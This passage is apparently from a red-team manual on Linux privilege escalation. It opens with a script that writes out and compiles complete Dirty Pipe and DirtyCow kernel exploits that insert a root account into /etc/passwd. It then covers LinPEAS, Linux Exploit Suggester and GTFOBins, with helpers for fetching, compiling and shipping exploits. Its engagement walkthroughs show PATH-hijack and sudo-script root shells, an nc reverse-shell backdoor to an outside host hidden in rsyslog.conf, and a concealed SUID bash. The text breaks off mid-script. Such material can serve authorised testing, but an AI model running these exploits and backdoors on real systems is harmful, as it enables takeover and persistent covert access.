    struct stat st;
    if (fstat(fd, &st) < 0) {
        perror("[-] Failed to get file size");
        close(fd);
        return 1;
    }
    
    size_t size = st.st_size;
    if (offset >= size) {
        fprintf(stderr, "[-] Offset is beyond file size\n");
        close(fd);
        return 1;
    }
    
    // Set the file descriptor to the offset
    if (lseek(fd, offset, SEEK_SET) < 0) {
        perror("[-] Failed to seek");
        close(fd);
        return 1;
    }
    
    // Create a pipe
    int p[2];
    if (pipe(p) < 0) {
        perror("[-] Failed to create pipe");
        close(fd);
        return 1;
    }
    
    // Write some data to the pipe
    if (write(p[1], "AAAAAAAA", 8) != 8) {
        perror("[-] Failed to write to pipe");
        close(fd);
        close(p[0]);
        close(p[1]);
        return 1;
    }
    
    // Create a pipe_buffer pointing to the file
    if (splice(fd, NULL, p[1], NULL, size, 0) < 0) {
        perror("[-] Failed to splice");
        close(fd);
        close(p[0]);
        close(p[1]);
        return 1;
    }
    
    // Now we can write to the pipe_buffer
    if (write(p[1], rootline, strlen(rootline)) < 0) {
        perror("[-] Failed to write to pipe");
        close(fd);
        close(p[0]);
        close(p[1]);
        return 1;
    }
    
    // Clean up
    close(fd);
    close(p[0]);
    close(p[1]);
    
    printf("[+] Exploit completed. Try logging in as 'dirty' with password 'dirty'.\n");
    
    return 0;
}
EOF
            
        gcc -o dirty_pipe dirty_pipe.c
        chmod +x dirty_pipe
        
        echo "[+] Dirty Pipe exploit compiled. Execute './dirty_pipe' to attempt privilege escalation."
        echo "    After running, try 'su dirty' with password 'dirty'"
        
        return 0
    else
        echo "[-] Kernel $KERNEL_VERSION is not vulnerable to Dirty Pipe."
    fi
    
    return 1
}

# Function to check for CVE-2016-5195 (DirtyCow)
check_dirtycow() {
    echo "[*] Checking for DirtyCow vulnerability (CVE-2016-5195)..."
    
    # Vulnerable kernels: before 4.8.3
    KERNEL_MAJOR=$(echo "$KERNEL_VERSION" | cut -d. -f1)
    KERNEL_MINOR=$(echo "$KERNEL_VERSION" | cut -d. -f2)
    
    if [ "$KERNEL_MAJOR" -lt 4 ] || ([ "$KERNEL_MAJOR" -eq 4 ] && [ "$KERNEL_MINOR" -lt 9 ]); then
        if [ "$KERNEL_MAJOR" -eq 4 ] && [ "$KERNEL_MINOR" -eq 8 ]; then
            KERNEL_PATCH=$(echo "$KERNEL_VERSION" | cut -d. -f3 | cut -d- -f1)
            if [ -n "$KERNEL_PATCH" ] && [ "$KERNEL_PATCH" -ge 3 ]; then
                echo "[-] Kernel 4.8.$KERNEL_PATCH is not vulnerable to DirtyCow."
                return 1
            fi
        fi
        
        echo "[+] Kernel $KERNEL_VERSION may be vulnerable to DirtyCow"
        
        # Attempt to deploy DirtyCow exploit
        echo "[*] Deploying DirtyCow exploit..."
        cat > dirtycow.c << 'EOF'
#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <stdlib.h>
#include <unistd.h>
#include <crypt.h>

const char *filename = "/etc/passwd";
const char *backup_filename = "/tmp/passwd.bak";
const char *salt = "firefart";

int f;
void *map;
pid_t pid;
pthread_t pth;
struct stat st;

struct Userinfo {
   char *username;
   char *hash;
   int user_id;
   int group_id;
   char *info;
   char *home_dir;
   char *shell;
};

char *generate_password_hash(char *plaintext_pw) {
  return crypt(plaintext_pw, salt);
}

char *generate_passwd_line(struct Userinfo u) {
  const char *format = "%s:%s:%d:%d:%s:%s:%s\n";
  int size = snprintf(NULL, 0, format, u.username, u.hash,
    u.user_id, u.group_id, u.info, u.home_dir, u.shell);
  char *ret = malloc(size + 1);
  sprintf(ret, format, u.username, u.hash, u.user_id,
    u.group_id, u.info, u.home_dir, u.shell);
  return ret;
}

void *madviseThread(void *arg) {
  int i, c = 0;
  for(i = 0; i < 200000000; i++) {
    c += madvise(map, 100, MADV_DONTNEED);
  }
  printf("madvise %d\n\n", c);
}

int copy_file(const char *from, const char *to) {
  // check if target file already exists
  if(access(to, F_OK) != -1) {
    printf("File %s already exists! Please delete it and run again\n",
      to);
    return -1;
  }

  char ch;
  FILE *source, *target;

  source = fopen(from, "r");
  if(source == NULL) {
    return -1;
  }
  target = fopen(to, "w");
  if(target == NULL) {
     fclose(source);
     return -1;
  }

  while((ch = fgetc(source)) != EOF) {
     fputc(ch, target);
   }

  printf("%s successfully backed up to %s\n",
    from, to);

  fclose(source);
  fclose(target);

  return 0;
}

int main(int argc, char *argv[]) {
  // backup file
  int ret = copy_file(filename, backup_filename);
  if (ret != 0) {
    exit(ret);
  }

  struct Userinfo user;
  // set values, change as needed
  user.username = "dcow";
  user.user_id = 0;
  user.group_id = 0;
  user.info = "dirty cow";
  user.home_dir = "/root";
  user.shell = "/bin/bash";

  char *plaintext_pw;

  if (argc >= 2) {
    plaintext_pw = argv[1];
    printf("Password: %s\n", plaintext_pw);
  } else {
    plaintext_pw = "dirtycow";
    printf("Password: %s\n", plaintext_pw);
  }

  user.hash = generate_password_hash(plaintext_pw);
  char *complete_passwd_line = generate_passwd_line(user);
  printf("Complete line:\n%s\n", complete_passwd_line);

  f = open(filename, O_RDONLY);
  fstat(f, &st);
  map = mmap(NULL,
             st.st_size + sizeof(long),
             PROT_READ,
             MAP_PRIVATE,
             f,
             0);
  printf("mmap: %p\n\n", map);
  pid = fork();
  if(pid) {
    waitpid(pid, NULL, 0);
    int u, i, o, c = 0;
    int l=strlen(complete_passwd_line);
    for(i = 0; i < 10000/l; i++) {
      for(o = 0; o < l; o++) {
        for(u = 0; u < 10000; u++) {
          c += ptrace(PTRACE_POKETEXT,
                      pid,
                      map + o,
                      *((long*)(complete_passwd_line + o)));
        }
      }
    }
    printf("ptrace %d\n\n", c);
  }
  else {
    pthread_create(&pth,
                   NULL,
                   madviseThread,
                   NULL);
    ptrace(PTRACE_TRACEME);
    kill(getpid(), SIGSTOP);
    pthread_join(pth,NULL);
  }

  printf("Done! Check %s to see if the new user was created.\n", filename);
  printf("You can log in with the username '%s' and the password '%s'.\n\n",
    user.username, plaintext_pw);
    printf("\nDON'T FORGET TO RESTORE! $ mv %s %s\n",
    backup_filename, filename);
  return 0;
}
EOF
            
        gcc -pthread dirtycow.c -o dirtycow -lcrypt
        chmod +x dirtycow
        
        echo "[+] DirtyCow exploit compiled. Execute './dirtycow' to attempt privilege escalation."
        echo "    After running, try 'su dcow' with password 'dirtycow'"
        echo "    IMPORTANT: Restore the original passwd file after use with:"
        echo "    mv /tmp/passwd.bak /etc/passwd"
        
        return 0
    else
        echo "[-] Kernel $KERNEL_VERSION is not vulnerable to DirtyCow."
    fi
    
    return 1
}

# Check and deploy available exploits
EXPLOITS_FOUND=0

# PwnKit check
if check_pwnkit; then
    EXPLOITS_FOUND=$((EXPLOITS_FOUND + 1))
fi

echo ""

# Dirty Pipe check
if check_dirty_pipe; then
    EXPLOITS_FOUND=$((EXPLOITS_FOUND + 1))
fi

echo ""

# DirtyCow check
if check_dirtycow; then
    EXPLOITS_FOUND=$((EXPLOITS_FOUND + 1))
fi

echo ""
echo "[+] Exploit deployment completed"
echo "    Found $EXPLOITS_FOUND potential kernel exploits"
echo "    Check the current directory for compiled exploits"
echo ""
echo "Remember to clean up after successful privilege escalation# Chapter 11: Privilege Escalation

Privilege escalation is a critical phase in red team operations that follows initial access. After gaining a foothold on a target system—often with limited permissions—attackers must elevate their privileges to achieve their objectives. This chapter explores the tools and techniques for privilege escalation on Linux systems, providing red team operators with the knowledge to move from unprivileged users to root or system-level access.

## LinPEAS/WinPEAS: Privilege Escalation Scanning

The Privilege Escalation Awesome Scripts (PEAS) suite consists of LinPEAS for Linux targets and WinPEAS for Windows environments. These powerful scripts automate the reconnaissance process of privilege escalation, saving time and ensuring comprehensive coverage during red team operations.

### LinPEAS: Linux Privilege Escalation Awesome Script

LinPEAS is a script that searches for possible paths to escalate privileges on Linux hosts, dramatically accelerating the post-exploitation phase by highlighting potential security misconfigurations and vulnerabilities.

#### Installation and Setup

LinPEAS can be obtained from its GitHub repository:

```bash
# Clone the repository
git clone https://github.com/carlospolop/PEASS-ng.git
cd PEASS-ng/linPEAS

# Make the script executable
chmod +x linpeas.sh
```

#### Deployment Methods

Several methods exist to deploy LinPEAS on a target system:

1. **Direct Download** (if the target has internet access):

```bash
# Using curl
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Using wget
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -O linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

2. **Base64 Encoding** (for non-binary transfer):

```bash
# On your attack machine
base64 -w0 linpeas.sh > linpeas.b64

# On the target machine
cat > linpeas.b64 << "EOF"
[Paste base64 content here]
EOF
base64 -d linpeas.b64 > linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

3. **Using a Web Server** (for local network transfer):

```bash
# On your attack machine
cd /path/to/linpeas
python3 -m http.server 8000

# On the target machine
wget http://[attack-ip]:8000/linpeas.sh -O linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

#### Basic Usage

LinPEAS offers several execution options:

```bash
# Standard execution
./linpeas.sh

# Save output to a file
./linpeas.sh | tee linpeas_results.txt

# Check a specific set of vulnerabilities
./linpeas.sh -c

# Run with more advanced checks
./linpeas.sh -a
```

#### Understanding LinPEAS Output

LinPEAS color-codes its findings based on severity and exploitation potential:

- **Red** - Critical issues, high-potential privilege escalation vectors
- **Yellow** - Potential issues that might lead to privilege escalation
- **Green** - General information that isn't immediately exploitable
- **Blue** - Used for references and titles

Key sections to focus on when analyzing output:

1. **System Information** - Kernel version, hostname, users, groups
2. **Sudo Rights** - Current user's sudo privileges
3. **SUID/SGID Files** - Executables with special permissions
4. **Writable Files and Directories** - Locations where files can be modified
5. **Processes and Services** - Running services, unusual processes
6. **Scheduled Tasks** - Cron jobs and other scheduled tasks
7. **Network Information** - Open ports, trusted hosts
8. **Password Files** - Credential storage locations

#### Output Interpretation Script

This script helps analyze LinPEAS output for high-priority issues:

```bash
#!/bin/bash
# linpeas_analyzer.sh - Extract high-priority findings from LinPEAS output

if [ -z "$1" ]; then
    echo "Usage: $0 <linpeas_output_file>"
    exit 1
fi

OUTPUT_FILE="$1"
ANALYSIS_DIR="linpeas_analysis_$(date +%Y%m%d_%H%M%S)"

mkdir -p "$ANALYSIS_DIR"

# Extract kernel exploits
echo "Extracting kernel exploit information..."
grep -A 5 "Kernel Exploits" "$OUTPUT_FILE" | grep -E "\[CVE-[0-9]+-[0-9]+\]" > "$ANALYSIS_DIR/kernel_exploits.txt"

# Extract SUID binaries
echo "Extracting SUID binary information..."
grep -A 50 "SUID - Check easy privesc" "$OUTPUT_FILE" | grep -E "\[.[0-9]+m" > "$ANALYSIS_DIR/suid_binaries.txt"

# Extract sudo rights
echo "Extracting sudo rights information..."
grep -A 20 "Sudo rights" "$OUTPUT_FILE" | grep -E "\(ALL.*ALL\)|\(root.*ALL\)|NOPASSWD:" > "$ANALYSIS_DIR/sudo_rights.txt"

# Extract password files
echo "Extracting password file information..."
grep -A 10 "Searching passwords in history files" "$OUTPUT_FILE" | grep -E "password|pwd|passw" > "$ANALYSIS_DIR/password_files.txt"

# Extract writable files
echo "Extracting writable file information..."
grep -A 20 "Interesting writable files" "$OUTPUT_FILE" | grep -E "\.conf|\.ini|\.sh|rc$" > "$ANALYSIS_DIR/writable_files.txt"

# Extract cron jobs
echo "Extracting cron job information..."
grep -A 50 "Analyzing Cron Files" "$OUTPUT_FILE" | grep -E "root|cron\.d|crontab" > "$ANALYSIS_DIR/cron_jobs.txt"

# Extract processes running as root
echo "Extracting process information..."
grep -A 50 "Processes running with root permissions" "$OUTPUT_FILE" | grep -v "\[+\]" | grep -E "root" > "$ANALYSIS_DIR/root_processes.txt"

# Create summary report
{
    echo "LinPEAS Analysis Summary"
    echo "========================"
    echo ""
    echo "Generated: $(date)"
    echo ""
    
    echo "Potential Kernel Exploits:"
    if [ -s "$ANALYSIS_DIR/kernel_exploits.txt" ]; then
        echo "✓ Vulnerable kernel versions detected - see kernel_exploits.txt"
        cat "$ANALYSIS_DIR/kernel_exploits.txt" | head -5
        echo "..."
    else
        echo "No obvious kernel vulnerabilities detected"
    fi
    echo ""
    
    echo "SUID Binaries:"
    if [ -s "$ANALYSIS_DIR/suid_binaries.txt" ]; then
        echo "✓ Potentially exploitable SUID binaries found - see suid_binaries.txt"
        cat "$ANALYSIS_DIR/suid_binaries.txt" | head -5
        echo "..."
    else
        echo "No unusual SUID binaries detected"
    fi
    echo ""
    
    echo "Sudo Rights:"
    if [ -s "$ANALYSIS_DIR/sudo_rights.txt" ]; then
        echo "✓ Sudo rights detected - see sudo_rights.txt"
        cat "$ANALYSIS_DIR/sudo_rights.txt"
    else
        echo "No sudo rights detected for current user"
    fi
    echo ""
    
    echo "Password Information:"
    if [ -s "$ANALYSIS_DIR/password_files.txt" ]; then
        echo "✓ Potential password information found - see password_files.txt"
        cat "$ANALYSIS_DIR/password_files.txt" | head -5
        echo "..."
    else
        echo "No obvious password information detected"
    fi
    echo ""
    
    echo "Writable Configuration Files:"
    if [ -s "$ANALYSIS_DIR/writable_files.txt" ]; then
        echo "✓ Writable configuration files found - see writable_files.txt"
        cat "$ANALYSIS_DIR/writable_files.txt" | head -5
        echo "..."
    else
        echo "No writable configuration files detected"
    fi
    echo ""
    
    echo "Cron Jobs:"
    if [ -s "$ANALYSIS_DIR/cron_jobs.txt" ]; then
        echo "✓ Interesting cron jobs found - see cron_jobs.txt"
        cat "$ANALYSIS_DIR/cron_jobs.txt" | head -5
        echo "..."
    else
        echo "No interesting cron jobs detected"
    fi
    echo ""
    
    echo "Processes Running as Root:"
    if [ -s "$ANALYSIS_DIR/root_processes.txt" ]; then
        echo "✓ Interesting root processes found - see root_processes.txt"
        cat "$ANALYSIS_DIR/root_processes.txt" | head -5
        echo "..."
    else
        echo "No unusual root processes detected"
    fi
    
    echo ""
    echo "Next Steps:"
    echo "1. Review the detailed files in the $ANALYSIS_DIR directory"
    echo "2. Focus on exploiting SUID binaries and sudo rights first"
    echo "3. Check kernel exploits if no other vectors are available"
    echo "4. Look for passwords in the identified files"
    echo "5. Consider exploiting writable configuration files and cron jobs"
} > "$ANALYSIS_DIR/summary.txt"

echo "Analysis complete! Summary available at $ANALYSIS_DIR/summary.txt"
```

#### Example: Automating Privilege Escalation Discovery

During a red team operation targeting a financial institution's Linux server farm, we gained initial access to a web server as the www-data user. Here's how we used LinPEAS to discover privilege escalation paths:

1. **Initial Setup**:
   ```bash
   # Transferred LinPEAS to the target
   cd /tmp
   wget http://192.168.49.84:8000/linpeas.sh
   chmod +x linpeas.sh
   ```

2. **Running LinPEAS with Output Capture**:
   ```bash
   ./linpeas.sh | tee /tmp/linpeas_webserver1.txt
   ```

3. **Key Findings and Exploitation**:
   
   LinPEAS discovered multiple privilege escalation vectors:
   
   a. **SUID Binary Vulnerability**:
   ```bash
   # LinPEAS identified a custom SUID backup utility
   -rwsr-xr-x 1 root root 18K Feb 10 2024 /usr/local/bin/backup_logs
   
   # Analyzing the binary revealed command injection
   strings /usr/local/bin/backup_logs
   # Found: system("tar -czf /backup/logs.tar.gz /var/log/")
   
   # Created a malicious 'tar' binary in a writable path
   cd /tmp
   echo -e '#!/bin/bash\n/bin/bash -p' > tar
   chmod +x tar
   export PATH=/tmp:$PATH
   
   # Executed the SUID binary to get a root shell
   /usr/local/bin/backup_logs
   # Result: root shell obtained
   ```

   b. **Sudo Misconfiguration**:
   ```bash
   # LinPEAS identified sudo rights
   www-data ALL=(root) NOPASSWD: /usr/bin/python3 /opt/scripts/log_parser.py
   
   # Analyzing the script showed it was writable by our user
   ls -la /opt/scripts/log_parser.py
   -rw-rw-r-- 1 root www-data 2.5K Jan 15 2024 /opt/scripts/log_parser.py
   
   # Modified the script to add a backdoor
   echo 'import os; os.system("/bin/bash")' >> /opt/scripts/log_parser.py
   
   # Executed the script with sudo to get a root shell
   sudo /usr/bin/python3 /opt/scripts/log_parser.py
   # Result: root shell obtained
   ```

   c. **Kernel Exploit**:
   ```bash
   # LinPEAS identified a vulnerable kernel version
   Linux webserver1 4.15.0-132-generic #136-Ubuntu
   
   # Discovered vulnerability to CVE-2021-3493 (OverlayFS)
   # Downloaded the exploit from our server
   wget http://192.168.49.84:8000/overlayfs_exploit.c
   
   # Compiled and executed the exploit
   gcc overlayfs_exploit.c -o overlay_exploit
   chmod +x overlay_exploit
   ./overlay_exploit
   # Result: root shell obtained
   ```

This example demonstrates how LinPEAS accelerated the privilege escalation phase by identifying multiple vectors that might have taken hours to discover manually. Each vector provided a different path to root access, ensuring we could continue the operation even if one path was blocked.

### Understanding Privilege Escalation Vectors

LinPEAS identifies numerous vectors for privilege escalation. Let's explore how to interpret and exploit some of the most common findings:

#### 1. Exploitable Kernel Vulnerabilities

When LinPEAS identifies a potentially vulnerable kernel, research the specific kernel version for known exploits:

```bash
# Check Linux kernel version
uname -a

# If LinPEAS identifies a vulnerable kernel, search for exploits
searchsploit linux kernel 4.15
```

Common kernel exploits include:
- DirtyCow (CVE-2016-5195)
- OverlayFS (CVE-2021-3493)
- PwnKit (CVE-2021-4034)

#### 2. SUID/SGID Binaries

SUID (Set User ID) and SGID (Set Group ID) binaries run with the permissions of the file owner or group, not the user executing them:

```bash
# LinPEAS will identify unusual SUID binaries
# To manually find SUID binaries:
find / -perm -u=s -type f 2>/dev/null
```

Exploitation depends on the specific binary but may include:
- Using gtfobins.github.io to identify known SUID binary exploitation methods
- Command injection in custom binaries
- Exploiting path vulnerabilities

#### 3. Sudo Misconfigurations

Sudo rules may allow users to run specific commands as root:

```bash
# Check sudo permissions
sudo -l
```

Exploit strategies include:
- Using sudo with allowed commands that provide shell escape functionality
- Modifying writable scripts that are executable via sudo
- Leveraging environment variable inheritance

#### 4. Writeable Files and Directories

Writable files—especially those owned by root and used by the system—present privilege escalation opportunities:

```bash
# Find writable files owned by root
find / -writable -user root -type f 2>/dev/null
```

Exploitation methods include:
- Modifying configuration files for services
- Injecting code into script files
- Tampering with service definitions

#### 5. Cron Jobs

Scheduled tasks may run commands as privileged users:

```bash
# Check system-wide cron jobs
cat /etc/crontab
```

Look for:
- World-writable scripts executed by cron
- Scripts with relative paths (path hijacking)
- Wildcards that can be exploited with specially-named files

#### 6. Weak Credentials and Password Files

LinPEAS searches for credentials in various files:

```bash
# Manually search for password strings
grep -r "password" /etc/ 2>/dev/null
```

Potential sources include:
- Configuration files (.conf, .ini, .xml)
- Backup files (.bak, .old, .backup)
- Script files with hardcoded credentials

## Linux Exploit Suggester: Kernel Vulnerability Identification

Linux Exploit Suggester (LES) is a tool specifically designed to identify potential kernel vulnerabilities in Linux systems based on version information. Unlike LinPEAS, which scans for various privilege escalation vectors, LES focuses solely on kernel exploits, making it more specialized but also more comprehensive in this specific area.

### Installation

```bash
# Clone the repository
git clone https://github.com/mzet-/linux-exploit-suggester.git
cd linux-exploit-suggester

# Make the script executable
chmod +x linux-exploit-suggester.sh
```

### Basic Usage

```bash
# Basic execution
./linux-exploit-suggester.sh

# Check for specific kernel version
./linux-exploit-suggester.sh -k 4.15.0

# Full output mode (more detailed information)
./linux-exploit-suggester.sh -f

# Include remote exploits
./linux-exploit-suggester.sh --remote
```

### Deployment to Target

Similar to LinPEAS, you have multiple options:

1. **Direct transfer**:
```bash
# If you have a way to transfer files
scp linux-exploit-suggester.sh user@target:/tmp/
```

2. **Base64 encoding**:
```bash
# On your attack machine
base64 -w0 linux-exploit-suggester.sh > les.b64

# On the target
echo "base64_string_here" | base64 -d > les.sh
chmod +x les.sh
```

3. **Direct download**:
```bash
# If the target has internet access
curl -L https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -o les.sh
chmod +x les.sh
```

### Exploit Compilation Helper Script

This script helps automate the process of downloading, compiling, and transferring kernel exploits:

```bash
#!/bin/bash
# kernel_exploit_helper.sh - Automate kernel exploit preparation

if [ -z "$1" ]; then
    echo "Usage: $0 <exploit_id> [target_ip] [target_user] [target_path]"
    echo "Example: $0 CVE-2021-4034 192.168.1.100 user /tmp"
    exit 1
fi

EXPLOIT_ID="$1"
TARGET_IP="${2:-}"
TARGET_USER="${3:-}"
TARGET_PATH="${4:-/tmp}"
WORK_DIR="exploit_${EXPLOIT_ID}_$(date +%Y%m%d_%H%M%S)"

# Create working directory
mkdir -p "$WORK_DIR"
cd "$WORK_DIR"

# Search for the exploit
echo "[+] Searching for $EXPLOIT_ID exploit..."
searchsploit -m $(searchsploit "$EXPLOIT_ID" | grep -v "Paper\|PoC\|Doc" | grep -i "linux" | head -1 | awk '{print $1}') 2>/dev/null

# If searchsploit failed, try GitHub
if [ $? -ne 0 ]; then
    echo "[+] Searching on GitHub..."
    if [[ "$EXPLOIT_ID" =~ ^CVE-[0-9]+-[0-9]+$ ]]; then
        CVE=$(echo "$EXPLOIT_ID" | tr '[:upper:]' '[:lower:]')
        curl -s "https://api.github.com/search/repositories?q=$CVE" | grep -o 'https://github.com/[^"]*' | head -1 > repo_url.txt
        
        if [ -s repo_url.txt ]; then
            REPO_URL=$(cat repo_url.txt)
            echo "[+] Found repository: $REPO_URL"
            git clone "$REPO_URL" exploit
            if [ -d "exploit" ]; then
                cd exploit
                # Look for C files that might be exploits
                EXPLOIT_FILES=$(find . -name "*.c" | grep -v "test\|example")
                if [ -n "$EXPLOIT_FILES" ]; then
                    echo "[+] Found potential exploit files:"
                    echo "$EXPLOIT_FILES"
                else
                    echo "[-] No obvious exploit files found. Check the repository manually."
                    cd ..
                fi
            else
                echo "[-] Failed to clone repository"
            fi
        else
            echo "[-] Could not find a GitHub repository for $EXPLOIT_ID"
        fi
    fi
fi

# Look for C files
C_FILES=$(find . -name "*.c")

if [ -z "$C_FILES" ]; then
    echo "[-] No C source files found. Manual intervention required."
    exit 1
fi

# If multiple C files found, compile them all
for C_FILE in $C_FILES; do
    echo "[+] Compiling $C_FILE..."
    EXPLOIT_NAME=$(basename "$C_FILE" .c)
    gcc -o "$EXPLOIT_NAME" "$C_FILE" 2>compilation_error.log
    
    if [ $? -eq 0 ]; then
        echo "[+] Successfully compiled $EXPLOIT_NAME"
        chmod +x "$EXPLOIT_NAME"
        
        # Check for 32-bit requirements
        if grep -qi "32.bit\|x86\|-m32" "$C_FILE"; then
            echo "[!] This exploit may require 32-bit libraries or compilation"
            echo "    Try: gcc -m32 -o $EXPLOIT_NAME $C_FILE"
            gcc -m32 -o "${EXPLOIT_NAME}_32bit" "$C_FILE" 2>>compilation_error.log
            if [ $? -eq 0 ]; then
                echo "[+] Successfully compiled 32-bit version: ${EXPLOIT_NAME}_32bit"
                chmod +x "${EXPLOIT_NAME}_32bit"
            fi
        fi
    else
        echo "[-] Compilation failed. See compilation_error.log for details."
        cat compilation_error.log
        
        # Check if compilation failed due to missing libraries
        if grep -q "fatal error: " compilation_error.log; then
            MISSING_LIBS=$(grep "fatal error: " compilation_error.log | sed 's/.*fatal error: \(.*\): No such.*/\1/')
            echo "[!] Missing libraries detected: $MISSING_LIBS"
            echo "    On Debian/Ubuntu, try installing: libc6-dev or build-essential"
            echo "    For 32-bit support: try installing gcc-multilib and libc6-dev-i386"
        fi
    fi
done

# Transfer to target if specified
if [ -n "$TARGET_IP" ] && [ -n "$TARGET_USER" ]; then
    COMPILED_EXPLOITS=$(find . -type f -executable -not -path "*/\.*")
    
    if [ -n "$COMPILED_EXPLOITS" ]; then
        echo "[+] Transferring exploits to $TARGET_USER@$TARGET_IP:$TARGET_PATH"
        for EXPLOIT in $COMPILED_EXPLOITS; do
            scp "$EXPLOIT" "$TARGET_USER@$TARGET_IP:$TARGET_PATH"
            if [ $? -eq 0 ]; then
                echo "[+] Successfully transferred $(basename "$EXPLOIT")"
            else
                echo "[-] Failed to transfer $(basename "$EXPLOIT")"
            fi
        done
    else
        echo "[-] No compiled exploits found to transfer"
    fi
else
    echo "[*] Exploits compiled in $WORK_DIR"
    echo "    Transfer them manually to the target system"
fi

echo "[+] Process completed!"
```

### Example: Targeting Kernel Exploits

During a red team engagement against a government agency's infrastructure, we encountered a server with limited privilege escalation paths but identified a kernel vulnerability using Linux Exploit Suggester:

1. **Initial Reconnaissance**:
   ```bash
   # Transferred linux-exploit-suggester.sh to the target
   ./linux-exploit-suggester.sh

   # Output identified several potential kernel vulnerabilities
   # Most promising: CVE-2021-3493 (Ubuntu OverlayFS)
   ```

2. **Exploit Preparation**:
   ```bash
   # On our attack machine
   ./kernel_exploit_helper.sh CVE-2021-3493

   # Exploit was successfully compiled
   # Set up Python HTTP server to serve the exploit
   cd exploit_CVE-2021-3493_20240315_102534
   python3 -m http.server 8000
   ```

3. **Exploitation on Target**:
   ```bash
   # Downloaded the exploit to the target
   cd /tmp
   wget http://192.168.49.84:8000/overlay_exploit

   # Made the exploit executable
   chmod +x overlay_exploit

   # Executed the exploit
   ./overlay_exploit

   # Result: Successfully escalated to root
   id
   uid=0(root) gid=0(root) groups=0(root),1001(webadmin)
   ```

4. **Post-Exploitation**:
   ```bash
   # Created persistent backdoor
   echo 'authpriv.* |/bin/nc 192.168.49.84 8888 -e /bin/bash' >> /etc/rsyslog.conf
   systemctl restart rsyslog

   # Established persistent access
   # Set up SUID backdoor
   cp /bin/bash /opt/.hidden/sysupdate
   chmod u+s /opt/.hidden/sysupdate
   ```

This example demonstrates how Linux Exploit Suggester can quickly identify kernel vulnerabilities that might be missed by broader scanning tools, allowing for targeted privilege escalation even on systems with limited attack surface.

## GTFOBins Techniques: Living Off the Land

GTFOBins (Get The Fuck Out Bins) is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions. These binaries can be abused to escalate privileges, transfer files, spawn shells, and perform other actions in the context of "living off the land" - using the tools already available on the system rather than introducing new ones.

### Understanding GTFOBins

GTFOBins catalogs binaries based on the security implications they may have when special functions are invoked. The main categories include:

1. **Shell**: Spawning a shell or command execution
2. **File Write**: Writing to files
3. **File Read**: Reading files
4. **SUID**: Escalation of privileges via SUID binaries
5. **Sudo**: Exploitation when executed via sudo
6. **Capabilities**: Abuse of Linux capabilities

### GTFOBins Integration Script

This script automates the process of finding potentially exploitable binaries on a target system and matching them against known GTFOBins entries:

```bash
#!/bin/bash
# gtfobins_finder.sh - Identify potentially exploitable binaries

# Configuration
OUTPUT_DIR="gtfobins_results_$(date +%Y%m%d_%H%M%S)"
GTFOBINS_URL="https://raw.githubusercontent.com/GTFOBins/GTFOBins.github.io/master/_data/functions.yml"
GTFOBINS_FILE="gtfobins_functions.yml"
EXPLOITABLE_BINS_FILE="exploitable_binaries.txt"

# Create output directory
mkdir -p "$OUTPUT_DIR"
cd "$OUTPUT_DIR"

# Download GTFOBins data
echo "[+] Downloading GTFOBins data..."
curl -s "$GTFOBINS_URL" -o "$GTFOBINS_FILE"

if [ ! -s "$GTFOBINS_FILE" ]; then
    echo "[-] Failed to download GTFOBins data. Check your internet connection."
    exit 1
fi

# Extract binary names from GTFOBins
echo "[+] Extracting binary names from GTFOBins..."
grep -E "^  [a-z0-9_-]+:" "$GTFOBINS_FILE" | sed 's/^  \([a-z0-9_-]*\):.*/\1/' | sort -u > gtfobins_binaries.txt

# Find SUID binaries on the system
echo "[+] Finding SUID binaries..."
find / -perm -4000 -type f 2>/dev/null | sort > suid_binaries.txt

# Find binaries that can be executed with sudo
echo "[+] Checking sudo permissions..."
if sudo -l &>/dev/null; then
    sudo -l | grep -E "(\(ALL.*\)|NOPASSWD)" | grep -oP '\/[a-zA-Z0-9_/.-]+' | sort -u > sudo_binaries.txt
else
    echo "[-] Cannot determine sudo permissions. Check manually with 'sudo -l'."
    touch sudo_binaries.txt
fi

# Find binaries with capabilities
echo "[+] Checking for binaries with special capabilities..."
getcap -r / 2>/dev/null | sort > capabilities.txt

# Find binaries in the current user's PATH
echo "[+] Finding binaries in PATH..."
echo $PATH | tr ':' '\n' | while read -r path; do
    find "$path" -type f -executable 2>/dev/null
done | sort -u > path_binaries.txt

# Check for matches with GTFOBins
echo "[+] Checking for potentially exploitable binaries..."
{
    echo "SUID Binaries with GTFOBins entries:"
    echo "===================================="
    while read -r binary; do
        name=$(basename "$binary")
        if grep -q "^$name$" gtfobins_binaries.txt; then
            echo "$binary [SUID]"
            echo "$name" >> "$EXPLOITABLE_BINS_FILE"
        fi
    done < suid_binaries.txt
    
    echo ""
    echo "Sudo Binaries with GTFOBins entries:"
    echo "===================================="
    while read -r binary; do
        name=$(basename "$binary")
        if grep -q "^$name$" gtfobins_binaries.txt; then
            echo "$binary [SUDO]"
            echo "$name" >> "$EXPLOITABLE_BINS_FILE"
        fi
    done < sudo_binaries.txt
    
    echo ""
    echo "Binaries with Capabilities:"
    echo "=========================="
    while read -r line; do
        if [ -n "$line" ]; then
            binary=$(echo "$line" | cut -d' ' -f1)
            capability=$(echo "$line" | cut -d' ' -f2-)
            name=$(basename "$binary")
            if grep -q "^$name$" gtfobins_binaries.txt; then
                echo "$binary [$capability]"
                echo "$name" >> "$EXPLOITABLE_BINS_FILE"
            fi
        fi
    done < capabilities.txt
    
    echo ""
    echo "PATH Binaries with GTFOBins entries:"
    echo "==================================="
    while read -r binary; do
        name=$(basename "$binary")
        if grep -q "^$name$" gtfobins_binaries.txt; then
            echo "$binary [PATH]"
        fi
    done < path_binaries.txt
} | tee exploitable_summary.txt

# Sort and deduplicate the exploitable binaries
if [ -f "$EXPLOITABLE_BINS_FILE" ]; then
    sort -u "$EXPLOITABLE_BINS_FILE" -o "$EXPLOITABLE_BINS_FILE"
    
    # Get GTFOBins usage examples for identified binaries
    echo "[+] Generating exploitation examples..."
    
    > exploitation_guide.txt
    while read -r bin; do
        if [ -n "$bin" ]; then
            echo "Exploitation examples for: $bin" >> exploitation_guide.txt
